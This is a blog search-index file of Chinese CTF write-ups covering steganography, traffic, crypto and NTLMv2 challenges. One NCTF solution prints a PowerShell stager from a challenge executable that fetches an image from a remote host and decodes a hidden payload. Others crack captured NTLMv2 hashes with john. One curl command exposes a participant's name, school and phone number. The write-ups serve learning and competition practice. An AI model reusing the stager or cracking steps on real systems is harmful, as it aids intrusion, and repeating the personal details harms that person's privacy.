<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023 SYCGeekchallenge-Writeup-Misc</title>
    <url>/2023/12/02/2023%20SYCGeekchallenge-Writeup-Misc/</url>
    <content><![CDATA[<h1>2023 SYCGeekchallenge-Writeup-Misc</h1>
<h2 id="Misc">Misc</h2>
<p>除区块链以外，还差一题ak，太菜啦，qwq~~</p>
<h3 id="cheekin">cheekin</h3>
<p><strong>考点：LSB隐写</strong></p>
<p>公众号发送flag，得到一张图片</p>
<p>检查为LSB隐写</p>
<p><img src="https://s2.loli.net/2023/12/02/2zahuAKp7Bx4iTI.png" alt="2023SYCgeek_1"></p>
<h3 id="ez-smilemo">ez_smilemo</h3>
<p><strong>考点：反编译，字符串搜索</strong></p>
<p>发现存在data.win文件，搜索后发现反编译工具UndertaleModTool</p>
<p>检索后发现存在一段base字符串</p>
<p><img src="https://s2.loli.net/2023/12/02/ZegbPd1kE59r3h4.png" alt="2023SYCgeek_2"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/fECjwTMqQnR6BWu.png" alt="2023SYCgeek_3"></p>
<h3 id="下一站是哪儿呢">下一站是哪儿呢</h3>
<p><strong>考点：文件分离，银河文字密码，信息搜集</strong></p>
<p>猪猪侠图片分离出一张图片，银河文字密码解密出得到IWANGTOGOYTOLIQUORCITY</p>
<p><img src="https://s2.loli.net/2023/12/02/a4Jy6OXvd2EhnmI.jpg" alt="2023SYCgeek_4"></p>
<p>然后搜索酒城得到泸州</p>
<p>查询8月25日航班得到答案</p>
<p><img src="https://s2.loli.net/2023/12/02/pnAdREa6PMzX7sC.png" alt="2023SYCgeek_5"></p>
<h3 id="Qingwan心都要碎了">Qingwan心都要碎了</h3>
<p><strong>考点：信息搜集</strong></p>
<p>做题流程  下载附件，是个网页；点进去，可以看到Yxx发的朋友圈；保存下来，用百度识图；发现是重庆中国三峡博物馆</p>
<h3 id="xqr">xqr</h3>
<p><strong>考点：文件分离，二维码xor</strong></p>
<p>首先使用foremost分离得到了两张二维码</p>
<p>由于其中有一张是模糊的，刚开始愣生生把那张修复好，但是完全扫不出东西</p>
<p>后来有了hint，才恍然大悟</p>
<p>一张尺寸为15×15，一张为75×75</p>
<p>首先 将两张恢复到同一尺寸，然后使用stegsolve的image combiner功能进行XOR</p>
<p><img src="https://s2.loli.net/2023/12/02/oQXf1PbvkL7g2YE.png" alt="2023SYCgeek_6"></p>
<p>得到的二维码用微信扫码就得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/bGOlcXa8ekYJ4FE.png" alt="2023SYCgeek_7"></p>
<h3 id="Tears-of-the-times">Tears of the times</h3>
<p><strong>考点：取证痕迹分析</strong></p>
<p>发现可疑地址</p>
<p><img src="https://s2.loli.net/2023/12/02/gb6V9ZC1MYpeq7R.png" alt="2023SYCgeek_8"></p>
<p>找到相应图片买得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/hLcjIl7mYRrz4Vx.png" alt="2023SYCgeek_9"></p>
<h3 id="extractMe">extractMe</h3>
<p><strong>考点：crc32碰撞</strong></p>
<p>crc32碰撞4字节的，结果看图</p>
<p><img src="https://s2.loli.net/2023/12/02/mxFMAk7o5NqtrQ6.png" alt="2023SYCgeek_10.PNG"></p>
<h3 id="DEATH-N0TE">DEATH_N0TE</h3>
<p><strong>考点：像素点提取，LSB隐写</strong></p>
<p>给了一张图片，010打开发现末尾有一段base，解密后无用</p>
<p>lsb查看发现存在一段base，解密后得到前半段flag</p>
<p>同时stegsolve查看发现像素点异常，故尝试提取</p>
<p>最终在每隔5个像素点得到需要的图片</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># 存放于同名文件夹之下</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;start.png&#x27;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 根据实际所需填写像素间隔</span></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">new_width = width // a</span><br><span class="line">new_height = height // a</span><br><span class="line"><span class="comment"># 创建一个新的图像对象</span></span><br><span class="line">new_img = Image.new(<span class="string">&quot;RGB&quot;</span>, (new_width, new_height))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height, a):</span><br><span class="line">        rgb = pix[x, y]</span><br><span class="line">        new_img.putpixel((x // a, y // a), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">new_img.save(<span class="string">&#x27;new_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/nDFfAt9IH7wJ5pq.png" alt="2023SYCgeek_11.PNG"></p>
<p>对照得到字符串</p>
<p>TkFNRV9vMnRha3VYWH0=</p>
<p>得到一半flag</p>
<p>还有一段藏在lsb隐写给的一长段base64中</p>
<p><img src="https://s2.loli.net/2023/12/02/yjqiaQmLWRSrAfb.png" alt="2023SYCgeek_12.PNG"></p>
<h3 id="DEATH-N1TE">DEATH_N1TE</h3>
<p><strong>考点：gaps拼图，sstv音频隐写</strong></p>
<p>将图片分帧，gaps拼图，得到一半flag</p>
<p><img src="https://s2.loli.net/2023/12/02/ZehOUiNatAV1oM4.png" alt="2023SYCgeek_13"></p>
<p>使用rx-sstv播放mp3文件获取第一部分flag</p>
<p><img src="https://s2.loli.net/2023/12/02/vTPGmZuJ7QMbX2q.png" alt="2023SYCgeek_14"></p>
<p>SYC{H4xr0t0r_14_Ki114R}</p>
<h3 id="DEATH-N2TE">DEATH_N2TE</h3>
<p><strong>考点：视频像素点提取</strong></p>
<p>先视频分帧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cap = cv2.VideoCapture(<span class="string">&#x27;kira.mp4&#x27;</span>)</span><br><span class="line">output_folder = <span class="string">&#x27;frames&#x27;</span></span><br><span class="line">os.makedirs(output_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line">frame_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    frame_count += <span class="number">1</span></span><br><span class="line">    frame_filename = <span class="string">f&quot;<span class="subst">&#123;output_folder&#125;</span>/frame_<span class="subst">&#123;frame_count:04d&#125;</span>.jpg&quot;</span></span><br><span class="line">    cv2.imwrite(frame_filename, frame)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;Processed Frame&#x27;</span>, frame)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">25</span>) &amp; <span class="number">0xFF</span> == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>提取所有白色的像素点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">input_folder = <span class="string">&#x27;./frames&#x27;</span></span><br><span class="line">output_image = <span class="string">&#x27;output_combined_image.jpg&#x27;</span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(input_folder) <span class="keyword">if</span> f.endswith((<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>))]</span><br><span class="line">max_x, max_y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    max_x = <span class="built_in">max</span>(max_x, image.shape[<span class="number">0</span>])</span><br><span class="line">    max_y = <span class="built_in">max</span>(max_y, image.shape[<span class="number">1</span>])</span><br><span class="line">combined_image = np.zeros((max_x, max_y, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    _, binary_image = cv2.threshold(gray_image, <span class="number">200</span>, <span class="number">255</span>, cv2.THRESH_BINARY)</span><br><span class="line">    white_pixel_coordinates = np.column_stack(np.where(binary_image == <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> coordinate <span class="keyword">in</span> white_pixel_coordinates:</span><br><span class="line">        x, y = coordinate</span><br><span class="line">        combined_image[x, y, :] = [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]  <span class="comment"># 设置为白色</span></span><br><span class="line">cv2.imwrite(output_image, combined_image)</span><br><span class="line">cv2.imshow(<span class="string">&#x27;Combined Image&#x27;</span>, combined_image)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>得到flag：SYC{we1c0m4_T0_De@tH_W0r1d}</p>
<p>最后压缩一下像素点，是图片更清楚</p>
<p><img src="https://s2.loli.net/2023/12/02/KzQufGPXsp7LZWx.png" alt="2023SYCgeek_15"></p>
<h3 id="窃听风云">窃听风云</h3>
<p><strong>考点：NTLM协议破解</strong></p>
<p>就是对捕捉的Ntlm协议进行解析</p>
<p>详细解析如下</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash">渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash (3gstudent.github.io)</a></p>
<p>基本格式</p>
<p>NTLMv2的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
<p>然后使用john和rockyou.txt破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NETNTLMv2: jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/yKxAprDETQG3HiV.png" alt="2023SYCgeek_16"></p>
<p><img src="https://s2.loli.net/2023/12/02/HM8U4bSsF6fjE1k.png" alt="2023SYCgeek_17"></p>
<h3 id="窃听风云-v2">窃听风云-v2</h3>
<p><strong>考点：NTLM协议破解</strong></p>
<p>这是仅有的没有做出来的一道题，qwq，其实不难的</p>
<p>基本原理同上，但是由于是使用的smtp协议，所以不能自动解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/1sX2j3rEeZNofSw.png" alt="2023SYCgeek_18"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>SYCGeekchallenge</tag>
      </tags>
  </entry>
  <entry>
    <title>2023Ciscn-Writeup</title>
    <url>/2023/09/28/2023Ciscn-Writeup/</url>
    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到卡">签到卡</h3>
<p><strong>考点：签到</strong></p>
<p>前往公众号查看提示</p>
<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
<p>print(open(‘/flag’).read())</p>
<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
<h3 id="被加密的生产流量">被加密的生产流量</h3>
<p><strong>考点：Modbus协议</strong></p>
<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
<p>将字符串进行base32编码，得到flag</p>
<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
<h3 id="国粹">国粹</h3>
<p><strong>考点：图片识别</strong></p>
<p>下载附件给出了三个图</p>
<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
<p>得到最终的flag为flag{202305012359}</p>
<h2 id="crypto">crypto</h2>
<h3 id="国密">国密</h3>
<p><strong>考点：可信计算</strong></p>
<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
<p>首先发送</p>
<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
<p>得到用户id</p>
<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
<p>生成SM2算法的公钥和密钥</p>
<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
<p>发送公钥</p>
<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
<p>得到结果</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>将随机数C密文采用SM2算法解密，得到结果</p>
<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
<p>向服务器请求密钥，得到回应</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
<p>发送验证，得到flag</p>
<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
<p><strong>考点：换表base64</strong></p>
<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023HITCTF-Misc-Writeup</title>
    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
<h2 id="前言">前言</h2>
<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
<h2 id="leftover-file">leftover file</h2>
<p><strong>考点：Modbus协议，变异凯撒</strong></p>
<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
<p>发现response存在异常</p>
<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
<p>然后每次的功能码3，进行一次新的修改操作</p>
<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
<p>到90 93发现flag已经格式完整</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
<p>单纯菜，qwq~~</p>
<h2 id="network-in-network">network-in-network</h2>
<p><strong>考点：神经网络逆向</strong></p>
<p>先来看一下官方给的</p>
<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
<p>我再研究研究，qwq</p>
<h2 id="H1F1">H1F1</h2>
<p><strong>考点：音频反向</strong></p>
<p>这道题就讲一下思路吧，不想动手复现了</p>
<p>根据官方wp和吉大师傅的简单操作了一下</p>
<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
<p>只能说学到了一个新的知识：音频diff</p>
<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
<p>可以发现下图的怪异bit点</p>
<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
<p>进行读取二进制0和1，最后转字符串就行了</p>
<h2 id="总结">总结</h2>
<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
<p>出题人太懂出题了（悲</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NCTF-Writeup-Misc</title>
    <url>/2024/02/03/2023NCTF-Writeup/</url>
    <content><![CDATA[<h1>2023NCTF-Writeup-Misc</h1>
<h2 id="前言">前言</h2>
<p>NSSCTF已上线所有题目，本次实际比赛的题目只做出来两题，剩余全为赛后复现</p>
<p>这里是Misc方向的复现，拖了好久，emmmmm</p>
<p>狠狠地谴责自己（</p>
<h2 id="Misc">Misc</h2>
<h3 id="Jump-For-Signin">Jump For Signin</h3>
<p><strong>考点：二维码</strong></p>
<p>进游戏跳跃一下，然后得到二维码，扫就行了</p>
<p><img src="https://s2.loli.net/2024/02/03/QGARhyquVPaX6kF.png" alt=""></p>
<h3 id="Jump-For-Flag">Jump For Flag</h3>
<p><strong>考点：二维码，dll逆向</strong></p>
<p>对Assembly-CSharp.dll进行反编译</p>
<p><img src="https://s2.loli.net/2024/02/03/L5f68uxZvk4SQd7.png" alt=""></p>
<p>找到二维码生成块的关键代码</p>
<p>然后exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_parameters</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    parameters = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        params = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&#x27;\d+&#x27;</span>, line)))</span><br><span class="line">        parameters.append(params)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">concatenate_images</span>(<span class="params">parameters</span>):</span><br><span class="line">    img_size = (<span class="number">310</span>, <span class="number">310</span>)</span><br><span class="line">    result_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, img_size, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> params <span class="keyword">in</span> parameters:</span><br><span class="line">        row, col, image_type = params[<span class="number">1</span>], params[<span class="number">3</span>], params[<span class="number">4</span>]</span><br><span class="line">        img_path = <span class="string">f&#x27;<span class="subst">&#123;image_type&#125;</span>.png&#x27;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        x_offset = col * <span class="number">10</span></span><br><span class="line">        y_offset = row * <span class="number">10</span></span><br><span class="line">        img = img.resize((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">        result_img.paste(img, (x_offset, y_offset))</span><br><span class="line">    result_img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parameters = read_parameters(<span class="string">&#x27;input1.txt&#x27;</span>)</span><br><span class="line">    concatenate_images(parameters)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/03/gfa897hZeRG2bO6.png" alt=""></p>
<h3 id="NCTF2077-jackpot">NCTF2077: jackpot</h3>
<p><strong>考点：powershell混淆</strong></p>
<p>首先是一个叫做喜报的邮件文件，打开可以发现一个图片和target.exe</p>
<p>010打开可以target.exe发现存在一段powershell代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;-873e-12a9595bbce8&#125;&quot;</span>;</span><br><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[] <span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>); <span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125; &#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
<p>实际比赛的时候对powershell不熟悉</p>
<p>所以是使用的python对代码进行了重置，得到的结果，而没有直接该运行为输出</p>
<p>这是赛时使用的</p>
